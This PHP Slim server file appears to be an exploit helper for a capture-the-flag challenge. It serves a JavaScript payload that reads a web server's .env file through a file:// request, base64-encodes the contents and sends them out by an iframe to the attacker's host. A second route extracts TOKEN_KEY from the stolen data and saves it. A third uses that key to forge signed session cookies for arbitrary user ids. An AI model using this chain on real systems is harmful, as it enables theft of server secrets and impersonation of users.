<?php

use MessagePack\MessagePack;
use \Psr\Http\Message\ServerRequestInterface as Request;
use \Psr\Http\Message\ResponseInterface as Response;

require __DIR__ . '/../vendor/autoload.php';

function hsh($data, $key)
{
    return hash_hmac('haval160,4', $data, $key);
}

function token($data, $key)
{
    $packed = MessagePack::pack($data);
    return MessagePack::pack([$packed, hsh($packed, $key)]);
}

$app = new \Slim\App();

$host = getenv('PUBLIC_HOST');

if (!$host) {
    $host = 'host.docker.internal:8080';
}


$app->get('/hckk', function (Request $request, Response $response, array $args) use ($host) {
    $query = $request->getQueryParams();
    $ip = $query['ip'];
    $payload = <<<EOD
var oReq = new XMLHttpRequest();
oReq.open("GET", "file:///var/www/html/.env");
oReq.onreadystatechange = function() {
    if (oReq.responseText.length > 0) {
        var b64 = btoa(oReq.responseText);
        document.write('<iframe src="http://$host/?ip=$ip&d='+b64+'"></iframe>');
    }
}
oReq.send();
document.write('kek');
EOD;
    return $response->withHeader('Content-Type', 'application/javascript')->write($payload);
});
$app->get('/', function (Request $request, Response $response, array $args) {
    $query = $request->getQueryParams();
    $data = $query['d'];
    $ip = $query['ip'];

    $decoded = base64_decode($data);
    $re = '/TOKEN_KEY=([A-Za-z0-9\+=\\\\\/]+)/m';
    preg_match_all($re, $decoded, $matches, PREG_SET_ORDER, 0);
    if (count($matches) > 0) {
        $match = $matches[0];
        if (count($match) > 1) {
            file_put_contents("/tmp/$ip", $match[1]);
        }
    }
    return $response->withStatus(200)->write('');
});

$app->get('/key', function (Request $request, Response $response, array $args) {
    $query = $request->getQueryParams();
    $ip = $query['ip'];
    $id = $query['id'];
    $key = file_get_contents("/tmp/$ip");
    if (!$key) {
        return $response->withJson(['error' => 'No key'], 412);
    }
    $data = ['cookie' => urlencode(token(['id' => $id, 'email' => 'user@cbsctf.live'], $key))];
    return $response->withJson($data, 200);
});

$app->run();